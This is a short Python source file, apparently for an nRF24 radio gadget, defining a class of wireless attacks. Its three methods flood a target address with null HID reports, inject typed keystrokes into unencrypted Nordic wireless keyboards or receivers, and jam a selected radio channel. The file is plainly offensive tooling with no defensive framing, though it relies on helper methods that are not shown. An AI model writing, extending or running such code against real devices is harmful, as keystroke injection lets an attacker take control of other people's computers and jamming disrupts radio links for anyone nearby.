import time

class BruceAttacks:
    def __init__(self, nrf_device):
        self.dev = nrf_device

    def hid_flood(self, target_addr, count=100):
        print(f"Flooding {target_addr}...")
        self.dev.nrf.open_tx_pipe(target_addr)
        for _ in range(count):
            self.dev.nrf.send(b'\x00\x00\x00\x00\x00') # Null HID report
            time.sleep_ms(5)

    def ducky_string(self, target_addr, text):
        print(f"Injecting string: {text}")
        # Note: This requires the device to be an unencrypted Nordic HID
        self.dev.send_hid_sequence(target_addr, text)

    def selective_jam(self, channel, duration=10):
        print(f"Killing CH {channel} for {duration}s")
        self.dev.nrf.set_channel(channel)
        self.dev.jam(duration=duration)